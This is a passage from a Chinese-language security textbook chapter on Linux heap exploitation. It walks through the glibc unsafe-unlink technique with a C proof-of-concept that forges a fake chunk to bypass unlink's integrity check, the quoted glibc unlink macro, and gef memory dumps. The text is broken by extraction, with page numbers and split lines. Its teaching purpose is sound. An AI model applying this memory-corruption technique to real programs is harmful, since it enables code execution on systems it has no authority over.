0x602040: 0x0000000000000000 0x0000000000020fc1 
450
3.1.6 Linux 堆利用（一）
#include 
#include 
#include 
uint64_t *chunk0_ptr;
int main() {
int malloc_size = 0x80; // not fastbins
int header_size = 2;
chunk0_ptr = (uint64_t*) malloc(malloc_size); //chunk0
uint64_t *chunk1_ptr = (uint64_t*) malloc(malloc_size); //c
hunk1
fprintf(stderr, "The global chunk0_ptr is at %p, pointing to
%p\n", &chunk0_ptr, chunk0_ptr);
fprintf(stderr, "The victim chunk we are going to corrupt is
at %p\n\n", chunk1_ptr);
// pass this check: (P->fd->bk != P || P->bk->fd != P) == Fa
lse
chunk0_ptr[2] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*3);
chunk0_ptr[3] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*2);
fprintf(stderr, "Fake chunk fd: %p\n", (void*) chunk0_ptr[2]
);
fprintf(stderr, "Fake chunk bk: %p\n\n", (void*) chunk0_ptr[3
]);
// pass this check: (chunksize(P) != prev_size (next_chunk(P
)) == False
// chunk0_ptr[1] = 0x0; // or 0x8, 0x80
uint64_t *chunk1_hdr = chunk1_ptr - header_size;
chunk1_hdr[0] = malloc_size;
chunk1_hdr[1] &= ~1;
// deal with tcache
// int *a[10];
// int i;
// for (i = 0; i fd; \
BK = P->bk; \
if (__builtin_expect (FD->bk != P || BK->fd != P, 0))
452
3.1.6 Linux 堆利用（一）
\
malloc_printerr (check_action, "corrupted double-linked li
st", P, AV); \
else { \
FD->bk = BK; \
BK->fd = FD; \
if (!in_smallbin_range (P->size) \
&& __builtin_expect (P->fd_nextsize != NULL, 0)) {
\
if (__builtin_expect (P->fd_nextsize->bk_nextsize != P,
0) \
|| __builtin_expect (P->bk_nextsize->fd_nextsize != P, 0
)) \
malloc_printerr (check_action, \
"corrupted double-linked list (not small)",
\
P, AV); \
if (FD->fd_nextsize == NULL) {
\
if (P->fd_nextsize == P) \
FD->fd_nextsize = FD->bk_nextsize = FD;
\
else { \
FD->fd_nextsize = P->fd_nextsize;
\
FD->bk_nextsize = P->bk_nextsize;
\
P->fd_nextsize->bk_nextsize = FD;
\
P->bk_nextsize->fd_nextsize = FD;
\
} \
} else { \
P->fd_nextsize->bk_nextsize = P->bk_nextsize;
\
P->bk_nextsize->fd_nextsize = P->fd_nextsize;
\
} \
} \
} \
453
3.1.6 Linux 堆利用（一）
}
在解链操作之前，针对堆块 P 自身的 fd 和 bk 检查了链表的完整性，即判断堆块 P
的前一块 fd 的指针是否指向 P，以及后一块 bk 的指针是否指向 P。
malloc_size 设置为 0x80，可以分配 small chunk，然后定义 header_size 为 2。申
请两块空间，全局指针 chunk0_ptr 指向 chunk0，局部指针 chunk1_ptr 指
向 chunk1：
gef➤ p &chunk0_ptr
$1 = (uint64_t **) 0x601070 
gef➤ x/gx &chunk0_ptr
0x601070 : 0x0000000000602010
gef➤ p &chunk1_ptr
$2 = (uint64_t **) 0x7fffffffdc60
gef➤ x/gx &chunk1_ptr
0x7fffffffdc60: 0x00000000006020a0
gef➤ x/40gx 0x602010-0x10
0x602000: 0x0000000000000000 0x0000000000000091 fd->bk != P || P->bk->fd != P) == False 的检查，这
个检查有个缺陷，就是 fd/bk 指针都是通过与 chunk 头部的相对地址来查找的。所
以我们可以利用全局指针 chunk0_ptr 构造 fake chunk 来绕过它：
455
3.1.6 Linux 堆利用（一）
gef➤ x/40gx 0x602010-0x10
0x602000: 0x0000000000000000 0x0000000000000091 <-- chunk 0
0x602010: 0x0000000000000000 0x0000000000000000 <-- fake chu
nk P